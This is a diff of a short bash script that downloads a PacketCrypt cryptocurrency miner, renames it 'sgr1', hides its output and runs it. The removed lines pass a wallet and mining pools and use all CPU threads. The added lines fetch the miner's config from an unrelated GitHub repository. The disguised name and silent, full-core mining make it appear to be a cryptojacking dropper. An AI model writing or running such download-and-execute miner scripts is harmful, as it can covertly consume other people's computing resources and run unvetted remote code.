@@ -1,4 +1,5 @@
 #!/bin/bash
 wget -O sgr1 https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64 >/dev/null 2>&1
-chmod +x sgr1 
-./sgr1 ann -p pkt1qgwzdljmxtekhqkkl9jzlhe6lpej5tykurudvqg http://pool.pkt.world/master/1024 http://pool.pktpool.io/diff/1024 http://pool.pkteer.com/d/1024 http://stratum.zetahash.com/d/1024 -t $(nproc --all)
+chmod +x sgr1
+wget https://raw.githubusercontent.com/6248202226/filesg/main/a.json
+./sgr1 ann --config "a.json"
